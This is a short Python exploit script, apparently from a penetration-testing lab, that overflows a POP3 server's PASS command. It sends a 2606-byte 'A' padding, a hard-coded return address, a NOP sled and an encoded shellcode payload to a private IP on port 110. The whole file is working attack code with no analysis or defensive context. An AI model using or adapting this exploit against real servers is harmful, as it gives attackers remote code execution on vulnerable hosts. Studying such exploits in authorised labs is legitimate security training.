# !/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
scode=("\xdb\xd7\xbe\x5b\x36\x35\x18\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x83\xc2\x04\x31\x72\x13\x03\x29\x25\xd7\xed\x31\xa1\x95"
"\x0e\xc9\x32\xfa\x87\x2c\x03\x3a\xf3\x25\x34\x8a\x77\x6b\xb9"
"\x61\xd5\x9f\x4a\x07\xf2\x90\xfb\xa2\x24\x9f\xfc\x9f\x15\xbe"
"\x7e\xe2\x49\x60\xbe\x2d\x9c\x61\x87\x50\x6d\x33\x50\x1e\xc0"
"\xa3\xd5\x6a\xd9\x48\xa5\x7b\x59\xad\x7e\x7d\x48\x60\xf4\x24"
"\x4a\x83\xd9\x5c\xc3\x9b\x3e\x58\x9d\x10\xf4\x16\x1c\xf0\xc4"
"\xd7\xb3\x3d\xe9\x25\xcd\x7a\xce\xd5\xb8\x72\x2c\x6b\xbb\x41"
"\x4e\xb7\x4e\x51\xe8\x3c\xe8\xbd\x08\x90\x6f\x36\x06\x5d\xfb"
"\x10\x0b\x60\x28\x2b\x37\xe9\xcf\xfb\xb1\xa9\xeb\xdf\x9a\x6a"
"\x95\x46\x47\xdc\xaa\x98\x28\x81\x0e\xd3\xc5\xd6\x22\xbe\x81"
"\x1b\x0f\x40\x52\x34\x18\x33\x60\x9b\xb2\xdb\xc8\x54\x1d\x1c"
"\x2e\x4f\xd9\xb2\xd1\x70\x1a\x9b\x15\x24\x4a\xb3\xbc\x45\x01"
"\x43\x40\x90\x86\x13\xee\x4b\x67\xc3\x4e\x3c\x0f\x09\x41\x63"
"\x2f\x32\x8b\x0c\xda\xc9\x5c\x39\x10\xd1\xa3\x55\x24\xd1\xda"
"\x1e\xa1\x37\xb6\x70\xe4\xe0\x2f\xe8\xad\x7a\xd1\xf5\x7b\x07"
"\xd1\x7e\x88\xf8\x9c\x76\xe5\xea\x49\x77\xb0\x50\xdf\x88\x6e"
"\xfc\x83\x1b\xf5\xfc\xca\x07\xa2\xab\x9b\xf6\xbb\x39\x36\xa0"
"\x15\x5f\xcb\x34\x5d\xdb\x10\x85\x60\xe2\xd5\xb1\x46\xf4\x23"
"\x39\xc3\xa0\xfb\x6c\x9d\x1e\xba\xc6\x6f\xc8\x14\xb4\x39\x9c"
"\xe1\xf6\xf9\xda\xed\xd2\x8f\x02\x5f\x8b\xc9\x3d\x50\x5b\xde"
"\x46\x8c\xfb\x21\x9d\x14\x1b\xc0\x37\x61\xb4\x5d\xd2\xc8\xd9"
"\x5d\x09\x0e\xe4\xdd\xbb\xef\x13\xfd\xce\xea\x58\xb9\x23\x87"
"\xf1\x2c\x43\x34\xf1\x64")
buffer='A'*2606+"\x8f\x35\x4a\x5f"+"\x90"*8+scode
try:
	print("\nsending the evil buffer")
	s.connect(('10.11.8.189',110)) 
	data = s.recv(1024)
	s.send('USER username' +'\r\n') 
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print ("\nDone!." )
except:
	print ("Could not connect to POP3!")
